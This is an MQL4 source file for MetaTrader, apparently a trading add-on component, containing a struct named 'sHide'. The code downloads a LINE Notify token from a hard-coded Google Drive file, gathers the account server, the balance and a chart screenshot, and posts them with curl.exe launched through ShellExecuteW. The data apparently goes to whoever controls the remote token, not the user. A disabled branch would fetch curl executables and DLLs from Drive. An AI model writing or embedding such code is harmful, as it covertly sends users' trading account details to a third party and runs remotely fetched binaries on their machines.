//+------------------------------------------------------------------+
//|                                                      ProjectName |
//|                                      Copyright 2012, CompanyName |
//|                                       http://www.companyname.net |
//+------------------------------------------------------------------+
#import "urlmon.dll"
int URLDownloadToFileW(int pCaller,string szURL,string szFileName,int dwReserved,int Callback);
#import
#import "shell32.dll"
int ShellExecuteW(int hwnd,string Operation,string File,string Parameters,string Directory,int ShowCmd);
#import
//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
struct sHide
  {
private:
   string            iLineToken;
public:
   void sHide()
     {

      string ha[6]=
        {
         "1WuxeSzM0JvNNXHChPGwps0QF7an3hZT7",
         "1NPSGBcJnikBBnfQbqwrzNoIqpkel-pWQ",
         "184Vr4y9NSJW9BkKYhe9IltxU_9hgCqb7",
         "1WuxeSzM0JvNNXHChPGwps0QF7an3hZT7",
         "1NPSGBcJnikBBnfQbqwrzNoIqpkel-pWQ",
         "184Vr4y9NSJW9BkKYhe9IltxU_9hgCqb7",
        };
      string na[6]=
        {
         "curl\\bin32\\curl-ca-bundle.crt",
         "curl\\bin32\\curl.exe",
         "curl\\bin32\\libcurl.dll",
         "curl\\bin64\\curl-ca-bundle.crt",
         "curl\\bin64\\curl.exe",
         "curl\\bin64\\libcurl-x64.dll",
        };

      string id="15dLxadJC2Z_L1PiQI2utqPMKz435ziOL";
      string FileName_Token="t.png";
      string sUrl="https://drive.google.com/uc?authuser=0&id="+id+"&export=download";
      string FilePath=StringConcatenate(TerminalInfoString(TERMINAL_DATA_PATH),"\\MQL4\\files\\curl\\",FileName_Token);
      int FileGet=URLDownloadToFileW(NULL,sUrl,FilePath,0,NULL);
      xmlRead("curl\\"+FileName_Token);

      int chk32=FileOpen("curl\\"+FileName_Token,FILE_READ|FILE_CSV);
      printf("chk32 "+chk32);
      datetime d=FileGetInteger(chk32,FILE_MODIFY_DATE);
      printf("MODIFY_DATE "+d+" | "+int(d));
      FileClose(chk32);



      //if(TimeLocal()-d>86400)
      if(false)
        {
         //string PathCommon=TerminalInfoString(TERMINAL_COMMONDATA_PATH);

         int filehandle;
         filehandle=FileOpen("curl\\bin32\\"+FileName_Token,FILE_WRITE|FILE_CSV); FileClose(filehandle);
         filehandle=FileOpen("curl\\bin64\\"+FileName_Token,FILE_WRITE|FILE_CSV); FileClose(filehandle);

         for(int i=0;i<6;i++)
           {
            string kid=ha[i];
            string kname=na[i];
            string ksUrl="https://drive.google.com/uc?authuser=0&id="+kid+"&export=download";
            string kFilePath=StringConcatenate(TerminalInfoString(TERMINAL_DATA_PATH),"\\MQL4\\Files\\",kname);
            int kFileGet=URLDownloadToFileW(NULL,ksUrl,kFilePath,0,NULL);
            //printf(FileGet);
           }
        }
     }
   void S()
     {
      string str;
      str+=AccountInfoString(ACCOUNT_SERVER)+"\n";
      str+=AccountInfoDouble(ACCOUNT_BALANCE)+"\n";
      Sent(str);
     }
private:
   string            sData;
   string GetFileName()
     {
      string T=TimeToStr(TimeLocal(),TIME_DATE|TIME_MINUTES);
      string Str=Symbol()+"-"+StringSetChar(T,StringFind(T,":"),'.')+".png";
      return (Str);
     }
   void Sent(string iLineMSG)
     {
      string folder="CaptureLine";
      string Src_path=TerminalInfoString(TERMINAL_DATA_PATH)+"\\MQL4\\Files\\"+folder+"\\";

      string FileName=GetFileName();
      string FullPath=Src_path+FileName;

      int SSWidth=int(ChartGetInteger(0,CHART_WIDTH_IN_PIXELS)+50);
      int SSHeight=int(ChartGetInteger(0,CHART_HEIGHT_IN_PIXELS)+50);
      ChartScreenShot(0,folder+"/"+FileName,SSWidth,SSHeight,0);

      string FilePath32=StringConcatenate(TerminalInfoString(TERMINAL_DATA_PATH),"\\MQL4\\Files\\curl\\bin32\\curl.exe");
      //string FilePath64=StringConcatenate(TerminalInfoString(TERMINAL_DATA_PATH),"\\MQL4\\Files\\curl\\bin64\\curl.exe");
      string LineBody;
      //---
      LineBody=" -X POST -H \"Authorization: Bearer "+iLineToken+"\"";
      LineBody+=" -F \"message="+iLineMSG+"\"";
      LineBody+=" -F \"imageFile=@"+FullPath + "\"";
      LineBody+=" https://notify-api.line.me/api/notify";
      printf(string(ShellExecuteW(NULL,"Open",FilePath32,LineBody,NULL,NULL)));
      //---
/*LineBody=" -X POST -H \"Authorization: Bearer "+iLineToken+"\"";
      LineBody+=" -F \"message="+iLineMSG+"64\"";
      LineBody+=" https://notify-api.line.me/api/notify";
      printf(string(ShellExecuteW(NULL,"Open",FilePath64,LineBody,NULL,NULL)));*/
     }
   void xmlRead(string FileName)
     {

      //---
      ResetLastError();
      int FileHandle=FileOpen(FileName,FILE_BIN|FILE_READ);

      if(FileHandle!=INVALID_HANDLE)
        {
         //--- receive the file size 
         ulong size=FileSize(FileHandle);
         //--- read data from the file
         while(!FileIsEnding(FileHandle))
            iLineToken=FileReadString(FileHandle,(int)size);
         //--- close
         FileClose(FileHandle);
         //printf("xmlRead: "+sData);
         //printf("xmlRead: "+SerialNumber_Decode(PrivateKey,sData));
        }
      //--- check for errors   
      //else PrintFormat(INAME+": failed to open %s file, Error code = %d",FileName,GetLastError());
      //---
     }
  };
//+------------------------------------------------------------------+
